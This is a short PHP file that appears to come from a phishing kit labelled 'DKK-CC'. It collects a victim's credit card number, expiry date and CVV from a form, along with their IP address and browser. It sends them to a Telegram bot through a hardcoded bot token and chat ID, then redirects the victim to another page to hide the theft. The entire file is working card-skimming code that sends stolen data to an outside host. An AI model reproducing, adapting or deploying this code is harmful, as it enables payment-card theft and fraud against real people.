<?php
$zabi = getenv("REMOTE_ADDR");
$message .= "-------DKK-CC---------\n";
$message .= "CC-M : ".$_POST['zz']."\n";
$message .= "EXP : ".$_POST['aa']."\n";
$message .= "CVV : ".$_POST['qq']."\n";
$message .= "----------- IP Infos -------\n";
$message .= "IP       : $zabi\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "---------------DKK-CC--------------------\n";
$token = "6142767231:AAE3TXvOHZVVhLH5-LPAjHJ9ThU6rzKY8w8";
$data = [
    'text' => $message,
    'chat_id' => '-5143241668'
];
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );

 

header("Location: ../pro.html");?>

<?php